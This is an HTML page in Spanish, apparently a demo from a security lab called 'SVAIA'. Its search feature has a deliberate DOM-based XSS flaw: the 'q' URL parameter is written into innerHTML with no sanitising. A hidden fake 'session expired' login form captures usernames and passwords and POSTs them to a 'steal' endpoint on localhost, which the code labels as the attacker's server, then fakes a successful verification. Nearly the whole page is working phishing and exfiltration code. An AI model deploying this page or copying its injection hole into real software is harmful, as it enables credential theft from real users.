<!DOCTYPE html>
<html>
<head>
    <title>B√∫squeda - SVAIA</title>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <div class="container mt-5">
        <h2>üîç B√∫squeda en el Sistema</h2>
        <div class="alert alert-info">
            <strong>Funci√≥n de b√∫squeda avanzada</strong><br>
            Utiliza par√°metros URL para buscar contenido espec√≠fico.
        </div>
        
        <!-- Contenedor vulnerable -->
        <div id="search-results" class="mt-4 p-3 border rounded bg-light">
            <h4>Resultados de b√∫squeda:</h4>
            <div id="results-content"></div>
        </div>
        
        <!-- ‚úÖ FORMULARIO DE PHISHING MEJORADO -->
        <div id="fake-login" style="display: none;" class="mt-5 p-4 border rounded" 
             style="background: linear-gradient(135deg, #ff6b6b, #ffd93d); color: white;">
            <div class="text-center mb-3">
                <i class="fas fa-exclamation-triangle fa-3x text-warning"></i>
            </div>
            <h4 class="text-center">‚ö†Ô∏è Sesi√≥n de seguridad expirada</h4>
            <p class="text-center"><strong>Por motivos de seguridad, tu sesi√≥n ha expirado.</strong></p>
            <p class="text-center">Para continuar, verifica tu identidad introduciendo tus credenciales:</p>
            
            <form id="credential-form" class="mx-auto" style="max-width: 400px;">
                <div class="mb-3">
                    <label class="form-label">Usuario:</label>
                    <input type="text" class="form-control" id="fake-username" placeholder="Introduce tu usuario" required>
                </div>
                <div class="mb-3">
                    <label class="form-label">Contrase√±a:</label>
                    <input type="password" class="form-control" id="fake-password" placeholder="Introduce tu contrase√±a" required>
                </div>
                <div class="d-grid">
                    <button type="submit" class="btn btn-primary btn-lg">
                        <i class="fas fa-lock"></i> Verificar Identidad
                    </button>
                </div>
            </form>
            
            <div class="text-center mt-3">
                <small class="text-muted">üîí Conexi√≥n segura SSL</small>
            </div>
        </div>
    </div>

    <script>
        // ‚ùå C√ìDIGO VULNERABLE - DOM-based XSS
        function displaySearchResults() {
            const urlParams = new URLSearchParams(window.location.search);
            const query = urlParams.get('q');
            const resultsDiv = document.getElementById('results-content');
            
            if (query) {
                // ‚ùå VULNERABLE: innerHTML sin sanitizar
                resultsDiv.innerHTML = `
                    <p>Buscando: <strong>${query}</strong></p>
                    <div class="spinner-border text-primary" role="status">
                        <span class="visually-hidden">Cargando...</span>
                    </div>
                `;
            } else {
                resultsDiv.innerHTML = '<p class="text-muted">Introduce un t√©rmino de b√∫squeda en la URL (?q=termino)</p>';
            }
        }

        // ‚úÖ MANEJO DEL FORMULARIO DE PHISHING
        document.getElementById('credential-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('fake-username').value;
            const password = document.getElementById('fake-password').value;
            
            console.log("üé£ Credenciales capturadas:", { username, password });
            
            // ‚úÖ ENVIAR CREDENCIALES AL SERVIDOR ATACANTE
            fetch('http://localhost:5004/steal', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    type: 'credentials',
                    username: username,
                    password: password,
                    timestamp: new Date().toISOString(),
                    origin: window.location.origin,
                    page: 'phishing_form'
                })
            }).then(response => {
                console.log("üì° Credenciales enviadas al atacante");
            }).catch(error => {
                console.log("‚ùå Error enviando credenciales:", error);
            });
            
            // ‚úÖ SIMULAR PROCESO DE VERIFICACI√ìN
            const submitBtn = document.querySelector('#credential-form button');
            const originalText = submitBtn.innerHTML;
            
            // Mostrar cargando
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
            submitBtn.disabled = true;
            
            setTimeout(() => {
                // Simular √©xito y redirigir
                submitBtn.innerHTML = '<i class="fas fa-check"></i> ¬°Verificado!';
                submitBtn.classList.remove('btn-primary');
                submitBtn.classList.add('btn-success');
                
                setTimeout(() => {
                    alert('‚úÖ Identidad verificada correctamente. Redirigiendo...');
                    window.location.href = '/';
                }, 1000);
            }, 2000);
        });

        // Ejecutar al cargar la p√°gina
        document.addEventListener('DOMContentLoaded', displaySearchResults);
    </script>
</body>
</html>